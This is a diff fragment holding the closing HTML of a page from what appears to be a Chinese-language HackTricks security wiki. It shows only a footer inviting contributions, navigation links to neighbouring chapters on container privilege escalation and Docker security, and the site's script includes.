+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/docker-security/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/docker-security/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
